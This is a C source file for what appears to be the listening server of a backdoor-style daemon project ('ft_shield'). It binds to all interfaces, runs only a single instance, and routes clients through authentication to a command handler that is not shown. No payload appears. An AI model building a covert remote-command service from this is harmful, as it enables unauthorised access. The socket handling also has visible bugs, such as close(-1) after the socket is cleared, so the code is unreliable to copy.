#include "../includes/ft_shield.h"
#include <string.h>
#include <strings.h>
#include <sys/select.h>

t_server* g_server;

void exit_properly(int exit_code) {
    // delete all clients 
    for (int i = 0; i < MAX_CLIENTS; i ++) {
        delete_client(g_server, g_server->clients[i].socket);
    }
    // prevent to writing on socket and infinit loop because waiting data
    shutdown(g_server->socket, SHUT_RDWR);
    // close server socket;
    close(g_server->socket);
    // exit daemon
    exit(exit_code);
}

void init_server(t_server* server) {
    struct sockaddr_in 		server_address;
    
    // clear and configure server address
	bzero(&server_address, sizeof(server_address));
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
	server_address.sin_port = htons(DAEMON_PORT);

    // create server socket
	if ((server->socket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		exit_properly(EXIT_FAILURE);

    // bind server socket
	if (bind(server->socket, (struct sockaddr*)& server_address, sizeof(server_address)) < 0) {
        // only one instance of this daemon must be launched
        // if port is already bind, it is assumed that the daemon is already running
        if (errno == EADDRINUSE)
            exit(EXIT_SUCCESS);
        exit(EXIT_FAILURE);
    }

    // listen for incoming connections
	if (listen(server->socket, MAX_CLIENTS) < 0)
		exit_properly(EXIT_FAILURE);

    // clear the file descriptor sets
	FD_ZERO(&server->fds_current);
    FD_ZERO(&server->fds_read);
    FD_ZERO(&server->fds_write);

    // add server socket to file descriptor set
	FD_SET(server->socket , &server->fds_current);

    // initialize clients list;
    for (int i = 0 ; i < MAX_CLIENTS; i++) {
        server->clients[i].socket = -1;
        server->clients[i].auth = false;
        bzero(server->clients[i].logs, sizeof(server->clients[i].logs));
    }

    // init number connection to 0
    server->nb_connection = 0;

    // save server socket number as max socket
    server->max_socket = server->socket;
}

void delete_client(t_server* server, int client_socket) {
    for (int i = 0 ; i < MAX_CLIENTS ; i++) {
        // found client socket to delete
        if (server->clients[i].socket == client_socket) {
            // clear files descriptor
            FD_CLR(client_socket, &server->fds_current);
            // enabling client socket for new connection
            server->clients[i].socket = -1;
            // set client to unauthenticated
            server->clients[i].auth = false;
            // prevent to writing on socket and infinit loop because waiting data
            shutdown(client_socket, SHUT_RDWR);
            // close socket client
            close(server->clients[i].socket);
            // decrease number of current connection on server
            server->nb_connection--;
            // clear logs
            bzero(server->clients[i].logs, sizeof(server->clients[i].logs));
        }
    }
}

void routine(t_server* server) {    
    char    buf[BUFFER_SIZE + 1];
    size_t  nbytes;

    for (;;) {
        // set all file descriptor from current set
        server->fds_read = server->fds_write = server->fds_current;
        
        // wait for activity on files descriptor
        if (select(FD_SETSIZE + 1, &server->fds_read, &server->fds_write, NULL, NULL) < 0)
			continue ;

        // activity is detected on some file descriptor
        for (int connection = 0 ; connection < server->max_socket + 1; connection++) {
            
            // there is some data to read
            if (FD_ISSET(connection, &server->fds_read)) {
                
                // new connection request on server socket
				if (connection == server->socket) {
					client_connection_handler(server);
                    break ;
                }
                // data is received on existing connection socket
                else {
                    
                    // clean buffer to receive data properly
                    bzero(&buf, BUFFER_SIZE + 1);
                    
                    // fill buffer with received data from client socket
                    if ((nbytes = recv(connection, buf, BUFFER_SIZE, 0)) <= 0)
                        delete_client(server, connection);

                    else {
                        // found client struct from connection socket
                        for (int i = 0 ; i < MAX_CLIENTS ; i++) {
                            if (server->clients[i].socket == connection) {
                                
                                // client is already authenticated
                                if (server->clients[i].auth == true) {
                                    client_command_handler(server, &server->clients[i], buf, nbytes);
                                }
                                else {
                                    // client need to be authenticated
                                    client_authentication_handler(server, &server->clients[i], buf, nbytes);
                                }

                                break ;
                                
                            }
                        }
                    }

                }
            }
        }

    }
}

void run_server() {
    t_server server;

    // save server address in globale variable to access server data after reveive some signal in signals_handler()
    g_server = &server;

    // init sockets and all others server data
    init_server(&server);
    
    // run main loop
    routine(&server);
}